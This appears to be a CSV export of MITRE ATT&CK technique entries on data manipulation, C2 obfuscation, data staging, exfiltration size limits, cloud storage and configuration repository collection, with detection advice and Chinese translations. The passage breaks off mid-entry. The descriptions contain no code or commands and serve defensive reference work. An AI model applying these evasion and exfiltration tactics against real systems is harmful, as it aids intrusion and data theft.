T1565.002,Data Manipulation: Transmitted Data Manipulation,"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.

Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",https://attack.mitre.org/techniques/T1565/002,02 March 2020,19 April 2022,1.1,Impact,"Detecting the manipulation of data as at passes over a network can be difficult without the appropriate tools. In some cases integrity verification checks, such as file hashing, may be used on critical files as they transit a network. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data. ","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: OS API Execution",True,T1565,,,,,,,Integrity,,"(Citation: Fortinet Metamorfo Feb 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: FireEye APT38 Oct 2018),(Citation: ESET LightNeuron May 2019),(Citation: ESET Casbaneiro Oct 2019),",篡改数据：传输的数据操作,攻击者可能会在传输到存储或其他系统的途中更改数据，以操纵外部结果或隐藏活动，从而威胁数据的完整性。（引用：FireEye APT38 Oct 2018）（引用：DOJ Lazarus Sony 2018）通过操纵传输的数据，对手可能会试图影响业务流程、组织理解和决策。可以通过网络连接或在有机会部署将拦截和更改信息的工具的系统进程之间进行操作。修改的类型及其将产生的影响取决于目标传输机制以及对手的目标和目的。对于复杂的系统，对手可能需要特殊的专业知识，并可能需要访问与系统相关的专业软件，这些软件通常需要通过长时间的信息收集活动才能产生预期的影响。
T1001,Data Obfuscation,"Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. ",https://attack.mitre.org/techniques/T1001,31 May 2017,15 March 2020,1.1,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,False,,,,,,,,,,"(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Check Point APT34 April 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Proofpoint TA505 Mar 2018),(Citation: Unit42 RDAT July 2020),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: FoxIT Wocao December 2019),",数据混淆,攻击者可能会混淆命令和控制流量，使其更难被发现。命令和控制 (C2) 通信是隐藏的（但不一定是加密的），试图使内容更难被发现或破译，并使通信不那么显眼并隐藏命令不被看到。这包括许多方法，例如将垃圾数据添加到协议流量、使用隐写术或冒充合法协议。
T1001.001,Data Obfuscation: Junk Data,"Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters. ",https://attack.mitre.org/techniques/T1001/001,15 March 2020,15 March 2020,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1001,,,,,,,,,"(Citation: ESET Sednit Part 3),(Citation: Securelist APT10 March 2021),(Citation: TrendMicro BlackTech June 2017),(Citation: Unit42 BendyBear Feb 2021),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: CrowdStrike StellarParticle January 2022),(Citation: CISA WellMess July 2020),(Citation: Group IB GrimAgent July 2021),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: FireEye APT28),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: Dell P2P ZeuS),(Citation: ESET PLEAD Malware July 2018),",数据混淆：垃圾数据,攻击者可能会将垃圾数据添加到用于命令和控制的协议中，从而使检测更加困难。通过向用于命令和控制的协议添加随机或无意义的数据，攻击者可以阻止用于解码、解密或以其他方式分析流量的琐碎方法。示例可能包括使用垃圾字符附加/前置数据或在重要字符之间写入垃圾字符。
T1001.003,Data Obfuscation: Protocol Impersonation,"Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  

Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. ",https://attack.mitre.org/techniques/T1001/003,15 March 2020,15 March 2020,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1001,,,,,,,,,"(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: US-CERT Bankshot Dec 2017),(Citation: Scarlet Mimic Jan 2016),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Zscaler Higaisa 2020),(Citation: US-CERT BADCALL),(Citation: ESET InvisiMole June 2020),(Citation: US-CERT HARDRAIN March 2018),(Citation: Novetta Blockbuster),(Citation: ESET InvisiMole June 2018),(Citation: Novetta Blockbuster Destructive Malware),(Citation: ESET Okrum July 2019),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: PWC KeyBoys Feb 2017),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: McAfee GhostSecret),",数据混淆：协议模拟,攻击者可能会冒充合法协议或网络服务流量来伪装指挥和控制活动并阻挠分析工作。通过冒充合法协议或 Web 服务，攻击者可以使他们的命令和控制流量与合法的网络流量混合。攻击者可能会冒充虚假的 SSL/TLS 握手，使后续流量看起来像是经过 SSL/TLS 加密的，可能会干扰某些安全工具，或者使流量看起来与受信任的实体相关。
T1001.002,Data Obfuscation: Steganography,"Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. ",https://attack.mitre.org/techniques/T1001/002,15 March 2020,15 March 2020,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1001,,,,,,,,,"(Citation: FireEye APT29),(Citation: Symantec Sunburst Sending Data January 2021),(Citation: GitHub Sliver HTTP),(Citation: Symantec W32.Duqu),(Citation: Proofpoint TA459 April 2017),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Trend Micro Daserf Nov 2017),(Citation: Unit42 RDAT July 2020),(Citation: Novetta-Axiom),(Citation: FireEye SUNBURST Additional Details Dec 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: ESET LightNeuron May 2019),(Citation: ESET Dukes October 2019),",数据混淆：隐写术,攻击者可能会使用隐写技术来隐藏命令和控制流量，从而使检测工作更加困难。隐写技术可用于隐藏在系统之间传输的数字消息中的数据。此隐藏信息可用于命令和控制受感染的系统。在某些情况下，使用隐写术嵌入的文件（例如图像或文档文件）的传递可用于命令和控制。
T1074,Data Staged,"Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)

In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)

Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.",https://attack.mitre.org/techniques/T1074,31 May 2017,20 July 2022,1.4,Collection,"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.

Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

Consider monitoring accesses and modifications to storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection.","IaaS, Linux, Windows, macOS","Command: Command Execution, File: File Access, File: File Creation, Windows Registry: Windows Registry Key Modification",False,,,"Praetorian; Shane Tully, @securitygypsy",,,,,,,"(Citation: Kaspersky Lyceum October 2021),(Citation: ESET Kobalos Jan 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: CrowdStrike Grim Spider May 2019),",数据暂存,攻击者可能会在渗出之前将收集的数据存放在中央位置或目录中。数据可以保存在单独的文件中，也可以通过[归档收集的数据](https://attack.mitre.org/techniques/T1560) 等技术组合成一个文件。可以使用交互式命令 shell，[cmd](https://attack.mitre.org/software/S0106) 和 bash 中的常用功能可用于将数据复制到暂存位置。（引文：PWC Cloud Hopper 2017 年 4 月) 在云环境中，攻击者可能会在泄露之前在特定实例或虚拟机中暂存数据。攻击者可以[创建云实例]（https://attack.mitre.org/techniques/T1578/002）并在该实例中暂存数据。（引用：Mandiant M-Trends 2020）攻击者可以选择暂存受害者的数据在渗透之前将网络放在一个集中位置，以最大限度地减少与其 C2 服务器的连接数量并更好地规避检测。
T1074.001,Data Staged: Local Data Staging,"Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.

Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",https://attack.mitre.org/techniques/T1074/001,13 March 2020,21 April 2022,1.1,Collection,"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.

Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

Consider monitoring accesses and modifications to local storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection.","Linux, Windows, macOS","Command: Command Execution, File: File Access, File: File Creation, Windows Registry: Windows Registry Key Modification",True,T1074,,"Massimiliano Romano, BT Security",,,,,,,"(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Kroll RawPOS Jan 2017),(Citation: Kaspersky Sofacy),(Citation: FoxIT Wocao December 2019),(Citation: Securelist Octopus Oct 2018),(Citation: Cofense Astaroth Sept 2018),(Citation: CISA AA20-301A Kimsuky),(Citation: ESET Crutch December 2020),(Citation: ESET Zebrocy Nov 2018),(Citation: ESET Sednit Part 2),(Citation: ESET Operation Groundbait),(Citation: Securelist Dtrack),(Citation: Cylance Machete Mar 2017),(Citation: Objective-See MacMa Nov 2021),(Citation: Accenture Dragonfish Jan 2018),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Novetta Blockbuster),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: FireEye FIN6 April 2016),(Citation: BlackBerry CostaRicto November 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Forcepoint Monsoon),(Citation: Prevailion DarkWatchman 2021),(Citation: ESET LightNeuron May 2019),(Citation: DFIR Conti Bazar Nov 2021),(Citation: ESET Sednit USBStealer 2014),(Citation: Unit 42 NOKKI Sept 2018),(Citation: aptsim),(Citation: Secureworks Karagany July 2019),(Citation: Cybereason PowerLess February 2022),(Citation: Symantec Dragonfly),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: CISA EB Aug 2020),(Citation: FBI FLASH APT39 September 2020),(Citation: ESET TeleBots Oct 2018),(Citation: Securelist Calisto July 2018),(Citation: Talos NavRAT May 2018),(Citation: McAfee Gold Dragon),(Citation: Palo Alto OilRig May 2016),(Citation: Microsoft SIR Vol 19),(Citation: Cybereason Kimsuky November 2020),(Citation: TrendMicro Ursnif Mar 2015),(Citation: FireEye Periscope March 2018),(Citation: Antiy CERT Ramsay April 2020),(Citation: Avira Mustang Panda January 2020),(Citation: ESET Carbon Mar 2017),(Citation: Unit 42 Kazuar May 2017),(Citation: McAfee Honeybee),(Citation: US-CERT TA18-074A),(Citation: Symantec Catchamas April 2018),(Citation: Symantec Darkmoon Aug 2005),(Citation: TrendMicro Patchwork Dec 2017),(Citation: FireEye MESSAGETAP October 2019),(Citation: Cisco Talos Intelligence Group),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Cylance Dust Storm),(Citation: Eset Ramsay May 2020),(Citation: Mandiant UNC3313 Feb 2022),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Morphisec ShellTea June 2019),(Citation: Kroll Qakbot June 2020),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Mandiant UNC3890 Aug 2022),(Citation: ATT Sidewinder January 2021),(Citation: Symantec W32.Duqu),(Citation: Talos Oblique RAT March 2021),(Citation: ESET InvisiMole June 2020),(Citation: FireEye NETWIRE March 2019),(Citation: ESET InvisiMole June 2018),(Citation: Palo Alto MoonWind March 2017),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Cybereason Soft Cell June 2019),(Citation: PWC Cloud Hopper April 2017),(Citation: Kaspersky MoleRATs April 2019),(Citation: Novetta Blockbuster Loaders),(Citation: Talos Kimsuky Nov 2021),(Citation: Symantec WastedLocker June 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: CyberBit Dtrack),(Citation: ESET Gelsemium June 2021),(Citation: Symantec Calisto July 2018),(Citation: FireEye APT30),(Citation: ClearSky Siamesekitten August 2021),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: ESET Machete July 2019),(Citation: Talos MuddyWater Jan 2022),(Citation: ESET Nomadic Octopus 2018),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Bitdefender Naikon April 2021),(Citation: FireEye TRITON 2019),(Citation: NCC Group Chimera January 2021),(Citation: ESET Attor Oct 2019),(Citation: Palo Alto Rover),(Citation: Malwarebytes Dyreza November 2015),",数据暂存：本地数据暂存,攻击者可能会在渗出之前将收集到的数据放在本地系统的中央位置或目录中。数据可以保存在单独的文件中，也可以通过[归档收集的数据](https://attack.mitre.org/techniques/T1560) 等技术组合成一个文件。可以使用交互式命令 shell，并且可以使用 [cmd](https://attack.mitre.org/software/S0106) 和 bash 中的常用功能将数据复制到暂存位置。攻击者还可能以系统的各种可用格式/位置（包括本地存储数据库/存储库或 Windows 注册表）暂存收集的数据。（引用：Prevailion DarkWatchman 2021）
T1074.002,Data Staged: Remote Data Staging,"Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.

In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)

By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",https://attack.mitre.org/techniques/T1074/002,13 March 2020,08 March 2021,1.1,Collection,"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.

Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","IaaS, Linux, Windows, macOS","Command: Command Execution, File: File Access, File: File Creation",True,T1074,,Praetorian,,,,,,,"(Citation: SecureWorks BRONZE UNION June 2017),(Citation: NCC Group Chimera January 2021),(Citation: McAfee Night Dragon),(Citation: FireEye FIN6 April 2016),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Volexity SolarWinds),(Citation: Symantec Cicada November 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: PWC Cloud Hopper April 2017),",数据暂存：远程数据暂存,攻击者可能会在渗出之前将从多个系统收集的数据存放在一个系统的中央位置或目录中。数据可以保存在单独的文件中，也可以通过[归档收集的数据](https://attack.mitre.org/techniques/T1560) 等技术组合成一个文件。可以使用交互式命令 shell，并且可以使用 [cmd](https://attack.mitre.org/software/S0106) 和 bash 中的常用功能将数据复制到暂存位置。在云环境中，攻击者可能会在渗出之前在特定实例或虚拟机中暂存数据。攻击者可以 [创建云实例](https://attack.mitre.org/techniques/T1578/002) 并在该实例中暂存数据。（引用：Mandiant M-Trends 2020）通过在渗出之前在一个系统上暂存数据，攻击者可以最大限度地减少与其 C2 服务器的连接数量，并更好地规避检测。
T1030,Data Transfer Size Limits,An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.,https://attack.mitre.org/techniques/T1030,31 May 2017,14 July 2020,1.0,Exfiltration,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow",False,,,,,,,,,,"(Citation: Dell TG-3390),(Citation: KISA Operation Muzabi),(Citation: Rclone),(Citation: Mythc Documentation),(Citation: cobaltstrike manual),(Citation: ESET ForSSHe December 2018),(Citation: Talos Oblique RAT March 2021),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: FireEye CARBANAK June 2017),(Citation: Palo Alto OilRig May 2016),(Citation: Unit42 RDAT July 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: FireEye POSHSPY April 2017),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Unit 42 OopsIE! Feb 2018),",数据传输大小限制,攻击者可能会以固定大小的块而不是整个文件的形式泄露数据，或者将数据包大小限制在特定阈值以下。该方法可用于避免触发网络数据传输阈值警报。
T1530,Data from Cloud Storage,"Adversaries may access data from improperly secured cloud storage.

Many cloud service providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. 

In other cases, SaaS application providers such as Slack, Confluence, and Salesforce also provide cloud storage solutions as a peripheral use case of their platform. These cloud objects can be extracted directly from their associated application.(Citation: EA Hacked via Slack - June 2021)(Citation: SecureWorld - How Secure Is Your Slack Channel - Dec 2021)(Citation: HackerNews - 3 SaaS App Cyber Attacks - April 2022)(Citation: Dark Clouds_Usenix_Mulazzani_08_2011)

Adversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.

This open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)

Adversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",https://attack.mitre.org/techniques/T1530,30 August 2019,18 October 2022,2.0,Collection,"Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity.","IaaS, SaaS",Cloud Storage: Cloud Storage Access,False,,,AppOmni; Netskope; Praetorian,,,,,,,"(Citation: Peirates GitHub),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Microsoft Azure Storage Security, 2019),(Citation: Amazon  AWS Temporary Security Credentials),(Citation: Google Cloud Encryption Key Rotation),(Citation: Amazon S3 Security, 2019)",来自云存储的数据/云存储对象中的数据,"攻击者可能会从不适当保护的云存储中访问数据。许多云服务提供商提供在线数据对象存储解决方案，例如 Amazon S3、Azure Storage 和 Google Cloud Storage。这些解决方案与其他存储解决方案（例如 SQL 或 Elasticsearch）的不同之处在于没有总体应用程序。可以使用云提供商的 API 直接检索来自这些解决方案的数据。在其他情况下，Slack、Confluence 和 Salesforce 等 SaaS 应用程序提供商也提供云存储解决方案作为其平台的外围用例。这些云对象可以直接从其关联的应用程序中提取。（引文：EA 黑客通过 Slack - 2021 年 6 月）（引文：SecureWorld - 您的 Slack 频道有多安全 - 2021 年 12 月）（引文：HackerNews - 3 SaaS 应用程序网络攻击 - 4 月2022)（引用：Dark Clouds_Usenix_Mulazzani_08_2011）攻击者可能会从这些云存储解决方案中收集敏感数据。提供商通常会提供安全指南来帮助最终用户配置系统，尽管错误配置是一个常见问题。（引用：Amazon S3 安全，2019）（引用：Microsoft Azure 存储安全，2019）（引用：谷歌云存储最佳实践，2019）已经发生了许多云存储未得到适当保护的事件，通常是无意中允许未经身份验证的用户进行公共访问，所有用户的访问范围过于广泛，甚至在身份访问管理系统控制之外的任何匿名人员都可以访问，甚至不需要基本的用户权限。这种开放访问可能会暴露各种类型的敏感数据，例如信用卡、个人身份信息或医疗记录。（引用：Trend Micro S3 Exposed PII，2017）（引用：Wired Magecart S3 Buckets，2019）（引用：HIPAA Journal S3 Breach, 2017)（引用：Rclone-mega-extortion_05_2021）攻击者还可以从源存储库、日志或其他方式获取然后滥用泄露的凭据，作为访问云存储对象的一种方式。"
T1602,Data from Configuration Repository,"Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.

Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",https://attack.mitre.org/techniques/T1602,19 October 2020,19 April 2022,1.0,Collection,Identify network traffic sent or received by untrusted hosts or networks that solicits and obtains the configuration information of the queried device.(Citation: Cisco Advisory SNMP v3 Authentication Vulnerabilities),Network,"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content",False,,,,,,,,,,",(Citation: Cisco Securing SNMP),(Citation: US-CERT-TA18-106A),(Citation: US-CERT TA17-156A SNMP Abuse 2017),(Citation: Cisco Blog Legacy Device Attacks)",来自配置存储库的数据/配置存储库中的数据,攻击者可能会从配置存储库中收集与受管设备相关的数据。管理系统使用配置存储库来配置、管理和控制远程系统上的数据。配置存储库还可以促进设备的远程访问和管理。攻击者可能以这些存储库为目标，以收集大量敏感的系统管理数据。来自配置存储库的数据可能会通过各种协议和软件公开，并且可以存储各种各样的数据，其中大部分可能与对手的发现目标一致。（引用：US-CERT-TA18-106A）（引用：US-CERT TA17- 156A SNMP 滥用 2017)
T1602.002,Data from Configuration Repository: Network Device Configuration Dump,"Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.

Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ",https://attack.mitre.org/techniques/T1602/002,20 October 2020,17 February 2022,1.0,Collection,Identify network traffic sent or received by untrusted hosts or networks. Configure signatures to identify strings that may be found in a network device configuration.(Citation: US-CERT TA18-068A 2018),Network,"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content",True,T1602,,,Administrator,,,,,,",(Citation: Cisco Securing SNMP),(Citation: US-CERT TA17-156A SNMP Abuse 2017),(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018),(Citation: Cisco Blog Legacy Device Attacks)",来自配置存储库的数据/配置存储库中的数据：网络设备配置转储,攻击者可能会访问网络配置文件以收集有关设备和网络的敏感数据。网络配置是一个文件，其中包含确定设备操作的参数。设备通常在运行时存储配置的内存副本，并在非易失性存储上存储单独的配置以在设备重置后加载。攻击者可以检查配置文件以揭示有关目标网络及其布局、网络设备及其软件的信息，或识别合法帐户和凭据以供以后使用。攻击者可以使用常见的管理工具和协议，例如简单网络管理协议 (SNMP) 和智能安装 (SMI)，来访问网络配置文件。（引用：US-CERT TA18-106A 网络基础设施设备 2018）（引用：思科博客Legacy Device Attacks）这些工具可用于从配置存储库中查询特定数据或配置设备以导出配置以供以后分析。
T1602.001,Data from Configuration Repository: SNMP (MIB Dump),"Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).

The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.

Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) ",https://attack.mitre.org/techniques/T1602/001,19 October 2020,22 October 2020,1.0,Collection,Identify network traffic sent or received by untrusted hosts or networks that expose MIB content or use unauthorized protocols.(Citation: Cisco Advisory SNMP v3 Authentication Vulnerabilities),Network,"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content",True,T1602,,,Administrator,,,,,,",(Citation: Cisco Securing SNMP),(Citation: US-CERT-TA18-106A),(Citation: US-CERT TA17-156A SNMP Abuse 2017),(Citation: Cisco Blog Legacy Device Attacks)",来自配置存储库的数据/配置存储库中的数据：SNMP（MIB 转储）,攻击者可能以管理信息库 (MIB) 为目标，以在使用简单网络管理协议 (SNMP) 管理的网络中收集和/或挖掘有价值的信息。 MIB 是一个配置存储库，它以对象标识符 (OID) 的形式存储可通过 SNMP 访问的变量信息。每个 OID 标识一个可以读取或设置的变量，并允许通过远程修改这些变量来执行主动管理任务，例如配置更改。 SNMP 可以让管理员深入了解他们的系统，例如系统信息、硬件描述、物理位置和软件包（引用：SANS Information Security Reading Room Securing SNMP Securing SNMP）。 MIB 还可能包含设备操作信息，包括运行配置、路由表和接口详细信息。攻击者可以使用 SNMP 查询直接从 SNMP 管理的设备收集 MIB 内容，以收集允许攻击者构建网络地图并促进未来有针对性的利用的网络信息。（引用：US-CERT-TA18-106A）（引用：思科博客旧设备攻击）
T1213,Data from Information Repositories,"Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. 

The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:

* Policies, procedures, and standards
* Physical / logical network diagrams
* System architecture diagrams
